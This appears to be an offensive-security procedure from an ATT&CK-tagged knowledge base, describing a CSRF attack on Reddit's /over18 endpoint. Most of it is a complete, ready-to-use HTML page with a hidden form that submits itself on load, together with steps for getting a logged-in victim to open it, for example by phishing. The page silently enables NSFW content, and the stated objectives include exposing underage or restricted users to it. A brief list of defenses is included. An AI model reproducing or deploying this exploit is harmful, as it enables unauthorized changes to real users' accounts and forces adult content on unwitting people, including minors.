---
tags:
  - csrf
  - exploit
  - html
  - javascript
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 5cde589c-08d1-4203-808d-4ed541e2e9b3
created_at: '2025-12-14T17:27:57.272Z'
updated_at: '2025-12-14T17:27:57.272Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Create-Malicious-CSRF-HTML-Form

## Summary

This procedure crafts a malicious HTML file that exploits the CSRF vulnerability in Reddit's /over18 endpoint by auto-submitting a POST request to enable NSFW preferences without modhash validation.

## Description

The /over18 endpoint handles POST requests to toggle the over18 setting but lacks CSRF protection via modhash. The malicious form targets this endpoint with a hidden 'over18=yes' input and uses JavaScript to submit automatically upon page load. When a victim (logged into Reddit) opens this HTML (e.g., via phishing), it silently updates their settings, forcing NSFW access. This demonstrates the vulnerability's impact on underage or restricted users.

## Requirements

1. Text editor (e.g., Notepad, VS Code)
2. Victim logged into Reddit in browser
3. Target NSFW subreddit URL for dest parameter

## Defense

Defensive measures and detection strategies:

- Implement modhash or CSRF tokens on all state-changing endpoints
- Use SameSite cookies to prevent cross-site requests
- Monitor for unusual preference changes

## Objectives

1. Bypass CSRF protection
2. Unauthorized enable of over18 preference
3. Force NSFW content exposure

## Instructions

### Step 1: Create HTML File

**Context**: Build the form targeting the vulnerable endpoint.

Open a text editor and save the following as 'csrf-exploit.html':

```html
<!DOCTYPE html>
<html>
<head><title>CSRF Exploit</title></head>
<body>
  <form id="csrfForm" action="https://old.reddit.com/over18?dest=https%3A%2F%2Fold.reddit.com%2Fr%2Fnsfw%2F" method="POST" style="display:none;">
    <input type="hidden" name="over18" value="yes">
  </form>
  <script>
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
```

> Replace 'r/nsfw' with the target subreddit. This form posts to /over18 without modhash.

### Step 2: Load in Victim Browser

**Context**: Trick the victim into opening the file while logged in.

Open 'csrf-exploit.html' in the browser (file:// or serve locally).

> Expected: JavaScript auto-submits; no visible prompt; preference updated silently.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[exploit]]
- [[html]]
- [[JavaScript]]
